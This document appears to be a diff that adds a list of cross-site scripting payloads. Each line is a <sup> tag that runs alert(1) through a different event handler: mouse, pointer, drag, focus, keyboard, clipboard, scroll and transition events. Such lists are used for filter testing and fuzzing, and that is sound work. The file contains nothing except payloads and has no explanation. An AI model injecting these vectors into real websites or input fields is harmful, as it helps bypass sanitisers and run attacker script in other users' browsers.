@@ -1,0 +1,38 @@
+<sup contenteditable onbeforeinput=alert(1)>test
+<sup draggable="true" ondrag="alert(1)" style=display:block>test</sup>
+<sup draggable="true" ondragend="alert(1)" style=display:block>test</sup>
+<sup draggable="true" ondragenter="alert(1)" style=display:block>test</sup>
+<sup draggable="true" ondragleave="alert(1)" style=display:block>test</sup>
+<sup draggable="true" ondragstart="alert(1)" style=display:block>test</sup>
+<sup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></sup>
+<sup id=x tabindex=1 onfocus=alert(1)></sup>
+<sup id=x tabindex=1 onfocusin=alert(1)></sup>
+<sup onafterscriptexecute=alert(1)><script>1</script>
+<sup onbeforescriptexecute=alert(1)><script>1</script>
+<sup onblur=alert(1) id=x tabindex=1 style=display:block>test</sup><input value=clickme>
+<sup onclick="alert(1)" style=display:block>test</sup>
+<sup oncontextmenu="alert(1)" style=display:block>test</sup>
+<sup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<sup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<sup ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</sup>
+<sup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</sup><input value=clickme>
+<sup onkeydown="alert(1)" contenteditable style=display:block>test</sup>
+<sup onkeypress="alert(1)" contenteditable style=display:block>test</sup>
+<sup onkeyup="alert(1)" contenteditable style=display:block>test</sup>
+<sup onmousedown="alert(1)" style=display:block>test</sup>
+<sup onmouseenter="alert(1)" style=display:block>test</sup>
+<sup onmouseleave="alert(1)" style=display:block>test</sup>
+<sup onmousemove="alert(1)" style=display:block>test</sup>
+<sup onmouseout="alert(1)" style=display:block>test</sup>
+<sup onmouseover="alert(1)" style=display:block>test</sup>
+<sup onmouseup="alert(1)" style=display:block>test</sup>
+<sup onmousewheel=alert(1) style=display:block>requires scrolling
+<sup onpointerdown=alert(1) style=display:block>XSS</sup>
+<sup onpointerenter=alert(1) style=display:block>XSS</sup>
+<sup onpointerleave=alert(1) style=display:block>XSS</sup>
+<sup onpointermove=alert(1) style=display:block>XSS</sup>
+<sup onpointerout=alert(1) style=display:block>XSS</sup>
+<sup onpointerover=alert(1) style=display:block>XSS</sup>
+<sup onpointerrawupdate=alert(1) style=display:block>XSS</sup>
+<sup onpointerup=alert(1) style=display:block>XSS</sup>
+<sup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></sup>
